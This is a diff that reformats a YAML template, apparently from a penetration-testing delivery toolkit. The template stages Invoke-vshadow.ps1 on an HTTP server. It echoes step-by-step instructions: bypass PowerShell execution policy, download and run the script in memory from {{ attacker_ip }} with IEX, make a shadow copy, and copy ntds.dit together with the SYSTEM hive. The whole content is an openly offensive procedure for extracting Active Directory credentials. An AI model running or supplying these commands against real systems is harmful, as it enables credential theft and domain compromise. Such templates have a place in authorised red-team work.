@@ -1,22 +1,21 @@
+---
 metadata:
-  filename: deliver-windows-vshadow-ps1.yaml
-  tags:
-  - windows
-  - privesc
-  created: '2025-03-29'
-  author: Unknown
-content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/vshadow/Invoke-vshadow.ps1\
-  \ packstation/outbound; \\\necho '================================================================';\
-  \ \\\necho '                      -----PowerShell-----                      '; \\\
-  \necho 'Preparation 1: Open Powershell with administrative privileges'; \\\necho\
-  \ 'Preparation 2: powershell -ep bypass'; \\\necho 'Deliver & Inject to memory:\
-  \ IEX (New-Object System.Net.Webclient).DownloadString(\\'http://{{ attacker_ip\
-  \ }}:{{ delivery_outbound_port }}/Invoke-vshadow.ps1\\')'; \\\necho 'Create Snapshot:\
-  \ Invoke-vshadow -volume \\'C:\\\\\\''; \\\necho 'Extract ntds file: cmd /c copy\
-  \ <shadow copy device>\\windows\\ntds\\ntds.dit {{ delivery_path_windows }}\\ntds.dit.bak';\
-  \ \\\necho 'Extract system file: reg.exe save hklm\\system {{ delivery_path_windows\
-  \ }}\\system.bak'; \\\necho '================================================================';\
-  \ \\\necho '                         -----CMD-----                          '; \\\
-  \necho '================================================================'; \\\n\
-  \ python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
-  \ }} -d packstation/outbound\n"
+  filename: "deliver-windows-vshadow-ps1.yaml"
+  tags: ["windows", "privesc"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/vshadow/Invoke-vshadow.ps1 packstation/outbound; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Preparation 1: Open Powershell with administrative privileges'; \
+  echo 'Preparation 2: powershell -ep bypass'; \
+  echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-vshadow.ps1\')'; \
+  echo 'Create Snapshot: Invoke-vshadow -volume \'C:\\\''; \
+  echo 'Extract ntds file: cmd /c copy <shadow copy device>\windows\ntds\ntds.dit {{ delivery_path_windows }}\ntds.dit.bak'; \
+  echo 'Extract system file: reg.exe save hklm\system {{ delivery_path_windows }}\system.bak'; \
+  echo '================================================================'; \
+  echo '                         -----CMD-----                          '; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
